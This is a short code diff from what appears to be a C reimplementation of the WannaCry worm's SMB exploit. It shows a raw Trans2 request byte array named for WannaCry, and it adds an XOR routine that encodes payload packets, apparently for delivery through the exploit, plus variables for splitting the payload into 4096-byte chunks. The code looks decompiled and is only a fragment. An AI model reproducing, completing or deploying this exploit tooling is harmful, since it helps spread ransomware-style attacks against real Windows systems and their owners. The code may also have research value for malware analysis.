@@ -6,6 +6,24 @@ unsigned char wannacry_Trans2_Request[] =
 "\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
 "\x00\x0e\x00\x0d\x10\x00";
 
+int encodePacket(unsigned int xor_key, char *buf, int size)
+{
+	int i;
+	char __xor_key[5];
+	i = 0;
+	*&__xor_key[1] = 0;
+	*__xor_key = xor_key;
+	if (size <= 0)
+		return 0;
+	do
+	{
+		*(i + buf) ^= __xor_key[i % 4];
+		++i;
+	} while ( i < size );
+	return 0;
+}
+
+
 int iterations = TotalSizeOfPayload / 4096;
 int remainder = TotalSizeOfPayload % 4096;
 int v28;
